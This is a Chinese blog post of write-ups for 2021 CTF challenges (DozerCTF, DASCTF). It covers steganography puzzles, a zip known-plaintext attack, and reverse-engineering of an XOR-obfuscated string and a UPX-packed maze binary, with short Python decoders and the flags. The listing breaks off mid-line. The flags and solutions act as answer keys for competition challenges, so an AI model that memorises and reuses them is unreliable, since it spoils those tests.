      <title>2021年各比赛wp</title>
      <link href="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/"/>
      <url>/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="水平有限，大家包涵"><a href="#水平有限，大家包涵" class="headerlink" title="水平有限，大家包涵"></a>水平有限，大家包涵</h2><p>因为本人的时间与水平很有限，所以不能也没时间复现所有比赛的所有方向的所有题。所以这里只挑一些我参加的比赛做出来的题，以及之后有时间复现的题。大家多多包涵。</p><h2 id="记录内容"><a href="#记录内容" class="headerlink" title="记录内容"></a>记录内容</h2><p>记录了2021年各个比赛所做题的wp，可能还会有复现的题目的wp。</p><h1 id="DozerCTF"><a href="#DozerCTF" class="headerlink" title="DozerCTF"></a>DozerCTF</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="不会有人以为re那道才是签到吧"><a href="#不会有人以为re那道才是签到吧" class="headerlink" title="不会有人以为re那道才是签到吧"></a>不会有人以为re那道才是签到吧</h3><h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp//image-20210529192924991.png" alt="image-20210529192924991"></p><p>在视频中发现flag</p><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DozerCTF&#123;w3lc0me_to_Do2erCTF&#125;</span><br></pre></td></tr></table></figure><h3 id="ezmisc"><a href="#ezmisc" class="headerlink" title="ezmisc"></a>ezmisc</h3><h4 id="用到的在线网站"><a href="#用到的在线网站" class="headerlink" title="用到的在线网站"></a>用到的在线网站</h4><p><a href="https://it365.gitlab.io/zh-cn/gif-frames/?zlan">在线动图分帧工具</a></p><p><a href="http://cdn.malu.me/qrdecode/">在线二维码扫描工具</a></p><h4 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h4><p>可以发现图片里面藏着两个图片文件，一个GIF文件，另一个是一个没用的PNG文件。用上面的在线分帧软件将图片一帧一帧地分开。得到的二维码再一张一张地扫得下面的内容(因为二维码也不是特别多，没必要再写个脚本搞)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 得到的内容是zoDCre&#123;FT_si_timiselp</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;zoDCre&#123;FT_si_timiselp&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(s), <span class="number">3</span>):</span><br><span class="line">    flag += s[i:i+<span class="number">3</span>][::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># DozerCTF&#123;is_it_simple</span></span><br></pre></td></tr></table></figure><p>可以感觉后面还是有东西的，估计东西就是在后面我以为没用的那个png文件中了。再扫描以下后面的二维码发现是一个零宽隐写，在线扫描一下。</p><p>得到的内容似乎是<code>我已经看见了，‎‏‏‍‏‍‌‏‍‏‎‏‏‏‌‏‍‌‏‎‍‌‌‎‎‏‏‏‍‌‏‍‏‎‏‍‏‎‏‍‏‎‌‏‎‍‏‌‎‎‏‍‏‎‌‏‌‌你呢？</code>，零宽之后得到的内容是<code>tntentinttteteteee</code>，往下没做动。</p><h1 id="DASCTF-X-BUU"><a href="#DASCTF-X-BUU" class="headerlink" title="DASCTF X BUU"></a>DASCTF X BUU</h1><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp//banner_1.png" alt="比赛banner"></p><h2 id="赛事介绍"><a href="#赛事介绍" class="headerlink" title="赛事介绍"></a>赛事介绍</h2><p>DASCTF，由杭州安恒信息网络空间安全学院主办，是面向所有网络安全爱好者举办的职业技能大赛，为优秀参赛选手提供相关职业实习机会；为热衷于竞赛的网络安全爱好者提供竞赛平台；为大赛挑选强劲战队，增加决赛获奖难度与竞赛乐趣；为用人单位选拔优质人才。 通过比赛形式，挖掘网络安全人才，提升网络安全建设能力，增强我国网络安全防御能力。 2021年，DASCTF与高校、战队合作，共举办6场竞赛，合作方包括海南大学、贵州大学、榆林学院、浙江农林大学、公大、国内知名CTF联盟BJD、国内知名战队NepNep、国内知名战队天璇Merak、国内知名战队V&amp;N，每场竞赛参与人数均在1500+，赛后调研好评率高达95%以上。</p><h2 id="MISC-1"><a href="#MISC-1" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>flag{welcome_to_dasctf_may}</p><h3 id="Holmes"><a href="#Holmes" class="headerlink" title="Holmes"></a>Holmes</h3><p>一张图片，winhex打开发现后面是rar压缩包文件，然后分离压缩包，图片上跳舞的小人密码解出来压缩包的密钥为<code>YOYARHHOLMES</code>，根据那两个颜色稍显重一点的内容猜测那两位字符可能是需要猜的，所以口令就是<code>YOUAREHOLMES</code></p><p>解压出的python文件的内容为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag=<span class="string">&quot;flag&#123;********************************&#125;&quot;</span></span><br><span class="line">encflag=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    encflag.append((<span class="built_in">ord</span>(flag[i])+i)%<span class="number">128</span>)</span><br><span class="line"><span class="built_in">print</span>(encflag)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">[102, 109, 99, 106, 127, 57, 60, 104, 60, 107, 61, 62, 65, 68, 115, 64, 67, 119, 66, 74, 73, 74, 119, 75, 74, 79, 79,</span></span><br><span class="line"><span class="string">76, 78, 82, 78, 85, 83, 84, 82, 86, 92, 34]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>简单逆向一下得flag为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">encflag = [<span class="number">102</span>, <span class="number">109</span>, <span class="number">99</span>, <span class="number">106</span>, <span class="number">127</span>, <span class="number">57</span>, <span class="number">60</span>, <span class="number">104</span>, <span class="number">60</span>, <span class="number">107</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">65</span>, <span class="number">68</span>, <span class="number">115</span>, <span class="number">64</span>, <span class="number">67</span>, <span class="number">119</span>, <span class="number">66</span>, <span class="number">74</span>, <span class="number">73</span>, <span class="number">74</span>, <span class="number">119</span>, <span class="number">75</span>, <span class="number">74</span>, <span class="number">79</span>, <span class="number">79</span>,</span><br><span class="line"><span class="number">76</span>, <span class="number">78</span>, <span class="number">82</span>, <span class="number">78</span>, <span class="number">85</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">82</span>, <span class="number">86</span>, <span class="number">92</span>, <span class="number">34</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encflag)-<span class="number">1</span>):</span><br><span class="line">    flag += <span class="built_in">chr</span>(encflag[i] - i)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># flag&#123;46a4b3357e13f0755a42651250633038</span></span><br><span class="line"><span class="comment"># flag&#123;46a4b3357e13f0755a42651250633038&#125;</span></span><br></pre></td></tr></table></figure><h3 id="rickroll-u"><a href="#rickroll-u" class="headerlink" title="rickroll_u"></a>rickroll_u</h3><p>明文攻击得口令为<code>t!m32R1</code></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp//image-20210529110002150.png" alt="明文攻击"></p><p>解压之后获得一段wav音频文件。</p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="PaperPlease"><a href="#PaperPlease" class="headerlink" title="PaperPlease"></a>PaperPlease</h3><p>题目描述：简单的字符串解密</p><p>确实只是一段简单的逆向，给出的变换后的字符串的内容为<code>DASCTF&#123;5c715207e3abed7dfb7c8ea9c82d0e29&#125;</code></p><p>主要负责变换字符串的部分的代码的逆向内容为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">subfhsadkhjbfleiowiuoyfgshjdvbsmnakl</span><span class="params">(__int64 a1, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">char</span> *dest; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  dest = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, (<span class="type">const</span> <span class="type">char</span> *)(a1 + <span class="number">7</span>));</span><br><span class="line">  dest[<span class="built_in">strlen</span>(dest) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  s = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, (<span class="type">const</span> <span class="type">char</span> *)(a2 + <span class="number">7</span>));</span><br><span class="line">  s[<span class="built_in">strlen</span>(s) - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(dest); ++i )</span><br><span class="line">    dest[i] ^= *((_BYTE *)unk_6984657 + i);</span><br><span class="line">  <span class="keyword">return</span> unk_sa7ydu3jb432(dest, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的部分再取最重要的变换的部分为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(dest); ++i )</span><br><span class="line">  dest[i] ^= *((_BYTE *)unk_6984657 + i);</span><br></pre></td></tr></table></figure><p>这里的<code>(_BYTE *)unk_6984657 </code>应该是一个地址，后面的<code>*()</code>的所有内容为如下的数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">.rodata:0000000000002008 unk_2008        db  56h ; V             ; DATA XREF: .data:_unk_6984657↓o</span><br><span class="line">.rodata:0000000000002009                 db    5</span><br><span class="line">.rodata:000000000000200A                 db  53h ; S</span><br><span class="line">.rodata:000000000000200B                 db  52h ; R</span><br><span class="line">.rodata:000000000000200C                 db    4</span><br><span class="line">.rodata:000000000000200D                 db    3</span><br><span class="line">.rodata:000000000000200E                 db  53h ; S</span><br><span class="line">.rodata:000000000000200F                 db  54h ; T</span><br><span class="line">.rodata:0000000000002010                 db    4</span><br><span class="line">.rodata:0000000000002011                 db  0Bh</span><br><span class="line">.rodata:0000000000002012                 db  53h ; S</span><br><span class="line">.rodata:0000000000002013                 db  51h ; Q</span><br><span class="line">.rodata:0000000000002014                 db    6</span><br><span class="line">.rodata:0000000000002015                 db    6</span><br><span class="line">.rodata:0000000000002016                 db  0Fh</span><br><span class="line">.rodata:0000000000002017                 db  55h ; U</span><br><span class="line">.rodata:0000000000002018                 db    5</span><br><span class="line">.rodata:0000000000002019                 db  5Bh ; [</span><br><span class="line">.rodata:000000000000201A                 db    3</span><br><span class="line">.rodata:000000000000201B                 db  56h ; V</span><br><span class="line">.rodata:000000000000201C                 db  0Eh</span><br><span class="line">.rodata:000000000000201D                 db    7</span><br><span class="line">.rodata:000000000000201E                 db  57h ; W</span><br><span class="line">.rodata:000000000000201F                 db  0Eh</span><br><span class="line">.rodata:0000000000002020                 db    1</span><br><span class="line">.rodata:0000000000002021                 db  0Dh</span><br><span class="line">.rodata:0000000000002022                 db  56h ; V</span><br><span class="line">.rodata:0000000000002023                 db    0</span><br><span class="line">.rodata:0000000000002024                 db    4</span><br><span class="line">.rodata:0000000000002025                 db    6</span><br><span class="line">.rodata:0000000000002026                 db  0Ah</span><br><span class="line">.rodata:0000000000002027                 db  5Dh ; ]</span><br><span class="line">.rodata:0000000000002028                 db    0</span><br><span class="line">.rodata:0000000000002029                 db    0</span><br><span class="line">.rodata:000000000000202A unk_202A        db  12h                 ; DATA XREF: init+30↑o</span><br><span class="line">.rodata:000000000000202B                 db  54h ; T</span><br><span class="line">.rodata:000000000000202C                 db  33h ; 3</span><br><span class="line">.rodata:000000000000202D                 db  0Ch</span><br><span class="line">.rodata:000000000000202E                 db  0Ah</span><br><span class="line">.rodata:000000000000202F                 db  1Ah</span><br><span class="line">.rodata:0000000000002030                 db    0</span><br><span class="line">.rodata:0000000000002031                 db    0</span><br><span class="line">.rodata:0000000000002032                 db    0</span><br><span class="line">.rodata:0000000000002033                 db    0</span><br><span class="line">.rodata:0000000000002034                 db    0</span><br><span class="line">.rodata:0000000000002035                 db    0</span><br><span class="line">.rodata:0000000000002036                 db    0</span><br><span class="line">.rodata:0000000000002037                 db    0</span><br></pre></td></tr></table></figure><p>简单整理一下为下面的内容（我不会写也没有ida的脚本，下面的全靠手工整理）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = [0x56, 0x5, 0x53, 0x52, 0x4, 0x3, 0x53, 0x54, 0x4, 0x0B, 0x53, 0x51, 0x6, 0x6, 0x0F, 0x55, 0x5, 0x5B, 0x3, 0x56,</span><br><span class="line">       0x0E, 0x7, 0x57, 0x0E, 0x1, 0x0D, 0x56, 0x0, 0x4, 0x6, 0x0A, 0x5D, 0x0, 0x0, 0x12, 0x54, 0x33, 0x0C, 0x0A, 0x1A]</span><br></pre></td></tr></table></figure><p>简单逆向一下得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ss = <span class="string">&#x27;5c715207e3abed7dfb7c8ea9c82d0e29&#x27;</span></span><br><span class="line">s2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">key = [<span class="number">0x56</span>, <span class="number">0x5</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x4</span>, <span class="number">0x3</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x4</span>, <span class="number">0x0B</span>, <span class="number">0x53</span>, <span class="number">0x51</span>, <span class="number">0x6</span>, <span class="number">0x6</span>, <span class="number">0x0F</span>, <span class="number">0x55</span>, <span class="number">0x5</span>, <span class="number">0x5B</span>, <span class="number">0x3</span>, <span class="number">0x56</span>,</span><br><span class="line">       <span class="number">0x0E</span>, <span class="number">0x7</span>, <span class="number">0x57</span>, <span class="number">0x0E</span>, <span class="number">0x1</span>, <span class="number">0x0D</span>, <span class="number">0x56</span>, <span class="number">0x0</span>, <span class="number">0x4</span>, <span class="number">0x6</span>, <span class="number">0x0A</span>, <span class="number">0x5D</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x12</span>, <span class="number">0x54</span>, <span class="number">0x33</span>, <span class="number">0x0C</span>, <span class="number">0x0A</span>, <span class="number">0x1A</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ss)):</span><br><span class="line">    s2 += <span class="built_in">chr</span>(<span class="built_in">ord</span>(ss[i]) ^ key[i])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;DASCTF&#123;&#x27;</span> + s2 + <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># DASCTF&#123;cfdc11cca823cb81c9456b67b5dd4c8d&#125;</span></span><br></pre></td></tr></table></figure><h3 id="end"><a href="#end" class="headerlink" title="end"></a>end</h3><p>emmm，因为我 前几天重装了系统，电脑里面没有PE检查工具，开始直接拖入ida32里面去了，但是其实加了一个UPX的壳，要先用工具脱壳再拖入ida32中。</p><p>拖入ida之后肯定是要先看看start函数了，但是没啥发现，直接shift+f12搜索字符串发现flag的痕迹，一路追过去发现关键代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_40238F</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4[<span class="number">22</span>]; <span class="comment">// [esp+18h] [ebp-47Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> Buffer[<span class="number">19</span>]; <span class="comment">// [esp+71h] [ebp-423h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6[<span class="number">16</span>]; <span class="comment">// [esp+84h] [ebp-410h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+94h] [ebp-400h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v8[<span class="number">250</span>]; <span class="comment">// [esp+98h] [ebp-3FCh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+480h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [esp+484h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [esp+488h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+48Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_402B50();</span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="keyword">sizeof</span>(v8));</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v7);</span><br><span class="line">      v0 = i++;</span><br><span class="line">      v8[v0] = v7;</span><br><span class="line">      <span class="keyword">switch</span> ( v7 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          v11 += <span class="number">7</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">          v11 -= <span class="number">7</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">          ++v11;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">          --v11;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !dword_406060[v11] )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( dword_406060[v11] != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;continue&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( dword_406060[v11] != <span class="number">35</span> );</span><br><span class="line">  <span class="keyword">while</span> ( v8[v9] )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = v9++;</span><br><span class="line">    v10 += v8[v1];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">sprintf</span>(Buffer, <span class="string">&quot;%d&quot;</span>, v10);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, Buffer);</span><br><span class="line">  sub_401410(v4);</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(Buffer);</span><br><span class="line">  sub_401451((<span class="type">int</span>)v4, Buffer, v2);</span><br><span class="line">  sub_401582(v4, v6);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;congratulation&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;the flag is &#123;&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>, (<span class="type">unsigned</span> __int8)v6[i]);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">125</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据题目提示”走啊走啊”可以猜测这是一道迷宫题。迷宫的地图为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span 